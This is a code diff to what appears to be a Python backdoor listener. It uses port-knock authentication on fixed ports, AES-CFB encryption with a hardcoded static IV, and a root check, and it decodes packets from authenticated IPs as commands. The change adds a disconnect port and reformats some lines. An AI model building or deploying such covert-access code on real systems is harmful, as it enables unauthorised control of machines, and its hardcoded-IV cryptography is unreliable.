@@ -1,4 +1,3 @@
-import time
 import base64
 import argparse
 import collections
@@ -13,6 +12,7 @@ from watchdog.events import FileSystemEventHandler
 from random import randint
 from Crypto.Cipher import AES
 from multiprocessing import Process
+
 CONN_IPS = collections.defaultdict(list)
 CMDS = collections.defaultdict(list)
 MONITOR = 0
@@ -21,7 +21,6 @@ INIT_VALUE = "JohnCenaTheChamp"
 
 
 class NewFileHandler(FileSystemEventHandler):
-
 	def __init__(self, packet):
 		self.packet = packet
 
@@ -35,15 +34,15 @@ class NewFileHandler(FileSystemEventHandler):
 
 
 def encrypt_val(string):
-    objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
-    encryptedData = base64.b64encode(objAES.encrypt(string))
-    return encryptedData
+	objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
+	encryptedData = base64.b64encode(objAES.encrypt(string))
+	return encryptedData
 
 
 def decrypt_val(string):
-    objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
-    decryptedData = objAES.decrypt(base64.b64decode(string))
-    return decryptedData
+	objAES = AES.new(MASTER_KEY, AES.MODE_CFB, INIT_VALUE)
+	decryptedData = objAES.decrypt(base64.b64decode(string))
+	return decryptedData
 
 
 def verify_root():
@@ -175,12 +174,17 @@ def port_knock_auth(packet):
 	dport = packet[2].dport
 	sport = packet[2].sport
 	access = [2525, 14156, 6364]
+	dc = 4242
 
 	# If the connecting IP has connected before
 	if(ip in CONN_IPS):
 		auth = CONN_IPS[ip]
 		# Connecting IP is already authenticated
 		if(auth == 3):
+			if(dport == dc):
+				del CONN_IPS[ip]
+				print("{} has disconnected".format(ip))
+				return
 			decode(packet)
 			return
 		elif(dport not in access):
